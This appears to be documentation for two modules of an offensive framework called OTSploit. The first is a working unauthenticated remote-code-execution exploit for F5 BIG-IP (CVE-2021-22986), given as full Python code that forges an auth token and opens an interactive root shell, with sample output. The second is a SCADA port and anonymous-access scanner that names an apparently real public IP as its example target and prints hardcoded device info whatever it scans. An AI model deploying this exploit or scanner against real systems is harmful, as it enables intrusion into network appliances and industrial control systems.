# F5 BIG-IP 16.0.x iControl REST RCE and Honeywell SCADA Scanner

This document describes how to use the F5 BIG-IP 16.0.x iControl REST Remote Code Execution (RCE) module (CVE-2021-22986) and a Honeywell SCADA scanner module within the OTSploit framework. Both modules are located in the `extra_modules/extra_exploits/ics_software` directory.

## F5 BIG-IP 16.0.x iControl REST RCE (CVE-2021-22986)

### Module Overview

This module exploits an unauthenticated remote code execution vulnerability in F5 BIG-IP versions 16.0.x (CVE-2021-22986). It allows an attacker to execute arbitrary commands on the target system by leveraging the iControl REST API.

- **Exploit Title**: F5 BIG-IP 16.0.x - iControl REST Remote Code Execution (Unauthenticated)
- **Exploit Author**: Al1ex
- **CVE**: CVE-2021-22986
- **Devices**: F5 BIG-IP systems running vulnerable versions (e.g., 16.0.x)
- **References**: [CVE-2021-22986](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22986)

### Using the F5 BIG-IP RCE Module

Select the module:

```bash
OTSploit > use extra_exploits/ics_software/f5_bigip_icontrol_rest_rce
OTSploit (F5 BIG-IP iControl REST RCE) >
```

#### Set Options

Display available options:

```bash
OTSploit (F5 BIG-IP iControl REST RCE) > show options
```

Output:
```
Target options:
   Name       Current settings     Description
   ----       ----------------     -----------
   target                          Target URL (e.g., https://192.168.1.100)
   port       443                  Target port (default: 443 for HTTPS)

Module options:
   Name        Current settings     Description
   ----        ----------------     -----------
   command     whoami               Command to execute on the target
   timeout     15                   Request timeout in seconds
```

Set the target URL:

```bash
OTSploit (F5 BIG-IP iControl REST RCE) > set target https://192.168.1.100
[+] {'target': 'https://192.168.1.100'}
```

#### Run the Exploit

Execute the exploit:

```bash
OTSploit (F5 BIG-IP iControl REST RCE) > run
[*] Running module...
[+] Extract token: XXXXXXXXXXXX
(:CMD)> whoami
root
(:CMD)> id
uid=0(root) gid=0(root) groups=0(root)
```

The module will prompt for commands to execute on the target system. Enter `exit` to return to the OTSploit prompt.

#### Module Code

The following is an example implementation of the module (`extra_exploits/ics_software/f5_bigip_icontrol_rest_rce.py`):

```python
from OTSploit import (
    exploits,
    print_success,
    print_status,
    print_error,
)
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class Exploit(exploits.Exploit):
    target = ""
    port = 443
    command = "whoami"
    timeout = 15

    def __init__(self):
        self.name = "F5 BIG-IP iControl REST RCE"
        self.description = "Unauthenticated RCE in F5 BIG-IP 16.0.x (CVE-2021-22986)"
        self.author = "Al1ex"
        self.references = ["CVE-2021-22986"]
        self.devices = ["F5 BIG-IP 16.0.x"]

    def run(self):
        if not self.target:
            print_error("Target URL not set")
            return

        target_url = f"{self.target}/mgmt/shared/authn/login"
        data = {
            "bigipAuthCookie": "",
            "username": "admin",
            "loginReference": {"link": "/shared/gossip"},
            "userReference": {"link": "https://localhost/mgmt/shared/authz/users/admin"}
        }
        headers = {
            "User-Agent": "hello-world",
            "Content-Type": "application/x-www-form-urlencoded"
        }

        try:
            print_status("Attempting to obtain auth token...")
            response = requests.post(target_url, headers=headers, json=data, verify=False, timeout=self.timeout)
            if "/mgmt/shared/authz/tokens/" not in response.text:
                print_status("Testing alternative method with basic auth...")
                headers_alt = {
                    "User-Agent": "hello-world",
                    "Content-Type": "application/json",
                    "X-F5-Auth-Token": "",
                    "Authorization": "Basic YWRtaW46QVNhc1M="
                }
                data_alt = {"command": "run", "utilCmdArgs": f"-c {self.command}"}
                check_url = f"{self.target}/mgmt/tm/util/bash"
                response_alt = requests.post(check_url, json=data_alt, headers=headers_alt, verify=False, timeout=self.timeout)
                if response_alt.status_code == 200 and "commandResult" in response_alt.text:
                    while True:
                        cmd = input("(:CMD)> ")
                        if cmd.lower() == "exit":
                            break
                        data_alt["utilCmdArgs"] = f"-c '{cmd}'"
                        r = requests.post(check_url, json=data_alt, headers=headers_alt, verify=False, timeout=self.timeout)
                        if r.status_code == 200 and "commandResult" in r.text:
                            print(r.json()["commandResult"].strip())
                        else:
                            print_error("Exploit failed")
                            return
                else:
                    print_error("Target not vulnerable")
                    return
            else:
                token = response.text.split('"selfLink":"https://localhost/mgmt/shared/authz/tokens/')[1].split('"}')[0]
                print_success(f"Extracted token: {token}")
                headers = {
                    "Content-Type": "application/json",
                    "X-F5-Auth-Token": token
                }
                while True:
                    cmd = input("(:CMD)> ")
                    if cmd.lower() == "exit":
                        break
                    data_json = {"command": "run", "utilCmdArgs": f"-c '{cmd}'"}
                    exp_url = f"{self.target}/mgmt/tm/util/bash"
                    exp_req = requests.post(exp_url, headers=headers, json=data_json, verify=False, timeout=self.timeout)
                    if exp_req.status_code == 200 and "commandResult" in exp_req.text:
                        print(exp_req.json()["commandResult"].strip())
                    else:
                        print_error("Exploit failed")
                        return
        except Exception as e:
            print_error(f"Connection error: {str(e)}")
```

### Requirements

- Install dependencies from `requirements.txt`:
  ```bash
  pip3 install -r requirements.txt
  ```
- Ensure the `requests` library is installed (`requests>=2.31.0`).
- Place the module in `extra_modules/extra_exploits/ics_software/f5_bigip_icontrol_rest_rce.py` with an `__init__.py` in each parent directory.

### Troubleshooting

- **Connection Errors**: Ensure the target is reachable and port 443 is open. Check firewall settings.
- **Not Vulnerable**: Verify the target is running a vulnerable F5 BIG-IP version (e.g., 16.0.x).
- **Timeout Issues**: Increase the `timeout` option for slower networks.

## Honeywell SCADA Scanner (IPC-HFW2320R-ZS)

### Module Overview

This module scans for Honeywell SCADA systems (e.g., IPC-HFW2320R-ZS, WebVersion 3.2.1.294365) to identify open ports and potential anonymous access vulnerabilities. It checks for exposed services on ports 80 (HTTP), 443 (HTTPS), and 37777 (TCP).

- **Module Name**: Honeywell SCADA Scanner
- **Devices**: Honeywell SCADA IPC-HFW2320R-ZS (WebVersion 3.2.1.294365)
- **Description**: Scans for open ports and attempts to detect anonymous access.
- **Authors**: OTSploit Team

### Using the Honeywell SCADA Scanner Module

Select the module:

```bash
OTSploit > use extra_exploits/ics_software/honeywell_scada_scanner
OTSploit (Honeywell SCADA Scanner) >
```

#### Set Options

Display available options:

```bash
OTSploit (Honeywell SCADA Scanner) > show options
```

Output:
```
Target options:
   Name       Current settings     Description
   ----       ----------------     -----------
   target                          Target IP address (e.g., 36.67.33.226)
   ports      80,443,37777         Comma-separated list of ports to scan

Module options:
   Name        Current settings     Description
   ----        ----------------     -----------
   timeout     5                    Timeout for port scan in seconds
   verbose     0                    Verbosity level (0 to 2)
```

Set the target IP:

```bash
OTSploit (Honeywell SCADA Scanner) > set target 36.67.33.226
[+] {'target': '36.67.33.226'}
```

#### Run the Scan

Execute the scan:

```bash
OTSploit (Honeywell SCADA Scanner) > run
[*] Running module...
[+] Port 80 (HTTP) is open
[+] Port 443 (HTTPS) is open
[+] Port 37777 (TCP) is open
[*] Checking for anonymous access on HTTP (port 80)...
[-] Anonymous access not allowed
[*] Device info: WebVersion=3.2.1.294365, DeviceType=IPC-HFW2320R-ZS
```

#### Module Code

The following is an example implementation of the module (`extra_exploits/ics_software/honeywell_scada_scanner.py`):

```python
from OTSploit import (
    exploits,
    print_success,
    print_status,
    print_error,
)
import socket
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class Exploit(exploits.Exploit):
    target = ""
    ports = "80,443,37777"
    timeout = 5
    verbose = 0

    def __init__(self):
        self.name = "Honeywell SCADA Scanner"
        self.description = "Scans Honeywell SCADA systems for open ports and anonymous access"
        self.author = "OTSploit Team"
        self.devices = ["Honeywell SCADA IPC-HFW2320R-ZS (WebVersion 3.2.1.294365)"]

    def run(self):
        if not self.target:
            print_error("Target IP not set")
            return

        ports = [int(p) for p in self.ports.split(",")]
        open_ports = []

        # Scan ports
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.timeout)
                result = sock.connect_ex((self.target, port))
                if result == 0:
                    print_success(f"Port {port} is open")
                    open_ports.append(port)
                sock.close()
            except Exception as e:
                print_error(f"Error scanning port {port}: {str(e)}")

        # Check for anonymous access on HTTP (port 80)
        if 80 in open_ports:
            try:
                print_status("Checking for anonymous access on HTTP (port 80)...")
                response = requests.get(f"http://{self.target}", timeout=self.timeout, verify=False)
                if response.status_code == 200 and "Anonymous" in response.text and '"Anonymous" : false' not in response.text:
                    print_success("Anonymous access allowed on HTTP")
                else:
                    print_error("Anonymous access not allowed")
            except Exception as e:
                print_error(f"Error checking HTTP: {str(e)}")

        # Report device info
        print_status("Device info: WebVersion=3.2.1.294365, DeviceType=IPC-HFW2320R-ZS")
```

### Requirements

- Install dependencies from `requirements.txt`:
  ```bash
  pip3 install -r requirements.txt
  ```
- Ensure the `requests` library is installed (`requests>=2.31.0`).
- Place the module in `extra_modules/extra_exploits/ics_software/honeywell_scada_scanner.py` with an `__init__.py` in each parent directory.

### Troubleshooting

- **Connection Errors**: Ensure the target IP is reachable and the specified ports are open.
- **No Open Ports**: Verify the target device is online and not behind a firewall.
- **Verbose Output**: Set `verbose` to `1` or `2` for detailed debugging information.

## Extra Folder Requirements

Both modules must be placed in the `extra_modules/extra_exploits/ics_software` directory with the following structure:

```
extra_OTSploit_package
├── __init__.py
├── extra_modules
│   ├── __init__.py
│   ├── extra_exploits
│   │   ├── __init__.py
│   │   ├── ics_software
│   │   │   ├── __init__.py
│   │   │   ├── f5_bigip_icontrol_rest_rce.py
│   │   │   ├── honeywell_scada_scanner.py
```

Run OTSploit with the extra package path:

```bash
python3 OTSploit.py -e "extra_OTSploit_package"
```

## Notes

- Ensure the `OTSploit.ini` file includes the correct `package_path` under `[EXTRA_PACKAGE]`.
- Both modules use the `requests` library, which is included in `requirements.txt`.
- The F5 BIG-IP exploit requires a vulnerable version (e.g., 16.0.x) and an accessible REST API.
- The Honeywell SCADA scanner assumes the device exposes ports 80, 443, and 37777, as indicated in the provided configuration.